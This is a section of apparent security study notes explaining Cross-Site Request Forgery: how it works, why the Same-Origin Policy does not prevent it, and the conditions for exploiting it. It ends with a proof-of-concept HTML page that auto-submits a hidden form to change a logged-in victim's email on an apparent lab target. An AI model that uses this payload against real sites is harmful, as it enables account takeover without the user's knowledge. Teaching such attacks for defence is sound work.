\section{Cross-Site Request Forgery (CSRF or XSRF)}
Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user
to execute inadvertent actions on a web application in which they are currently
authenticated. This attack is usually mounted with the help of attacker-crafted
web pages that the victim must visit or interact with, leveraging the lack of
anti-CSRF security mechanisms. These web pages contain malicious requests that
essentially inherit the identity and privileges of the victim to perform an
undesired function on the victim's behalf. CSRF attacks generally target
functions that cause a state change on the server but can also be used to
access sensitive data.


During CSRF attacks, the attacker does not need to read the server's response
to the malicious cross-site request. This means that
\href{https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy}{Same-Origin
Policy} cannot be considered a security mechanism against CSRF attacks.

web application is vulnerable to CSRF attacks when:
\begin{itemize}
    \item All the parameters required for the targeted request can be determined or guessed by the attacker
    \item The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
\end{itemize}

To successfully exploit a CSRF vulnerability, we need:
\begin{itemize}
    \item To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
    \item The victim to be logged into the application at the time when the malicious cross-site request is issued
\end{itemize}


\begin{verbatim}
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
\end{verbatim}

